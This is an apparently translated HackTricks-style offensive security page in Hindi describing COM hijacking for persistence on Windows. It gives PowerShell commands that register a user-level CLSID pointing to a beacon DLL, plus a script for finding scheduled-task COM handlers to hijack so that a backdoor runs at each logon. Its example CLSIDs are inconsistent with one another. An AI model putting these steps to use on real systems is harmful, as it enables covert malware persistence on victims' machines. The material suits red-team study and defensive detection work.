# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### गैर-मौजूद COM घटकों की खोज

चूंकि HKCU के मानों को उपयोगकर्ताओं द्वारा संशोधित किया जा सकता है, **COM Hijacking** को **स्थायी तंत्र** के रूप में उपयोग किया जा सकता है। `procmon` का उपयोग करके, उन खोजे गए COM रजिस्ट्रियों को खोजना आसान है जो मौजूद नहीं हैं और जिन्हें एक हमलावर स्थायी बनाने के लिए बना सकता है। फ़िल्टर:

- **RegOpenKey** संचालन।
- जहाँ _Result_ **NAME NOT FOUND** है।
- और _Path_ **InprocServer32** पर समाप्त होता है।

एक बार जब आप तय कर लें कि किस गैर-मौजूद COM का अनुकरण करना है, तो निम्नलिखित कमांड चलाएँ। _यदि आप किसी ऐसे COM का अनुकरण करने का निर्णय लेते हैं जो हर कुछ सेकंड में लोड होता है, तो सावधान रहें क्योंकि यह अत्यधिक हो सकता है._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### Hijackable Task Scheduler COM components

Windows Tasks Custom Triggers का उपयोग COM ऑब्जेक्ट्स को कॉल करने के लिए करते हैं और चूंकि इन्हें Task Scheduler के माध्यम से निष्पादित किया जाता है, इसलिए यह भविष्यवाणी करना आसान होता है कि ये कब ट्रिगर होंगे।

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

आउटपुट की जांच करते समय, आप एक ऐसा चयन कर सकते हैं जो **हर बार एक उपयोगकर्ता लॉग इन करता है** उदाहरण के लिए निष्पादित होने वाला है।

अब **HKEY\CLASSES\ROOT\CLSID** और HKLM और HKCU में CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** की खोज करते समय, आप आमतौर पर पाएंगे कि यह मान HKCU में मौजूद नहीं है।
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
फिर, आप बस HKCU प्रविष्टि बना सकते हैं और हर बार जब उपयोगकर्ता लॉग इन करता है, तो आपका बैकडोर सक्रिय हो जाएगा।

{{#include ../../banners/hacktricks-training.md}}
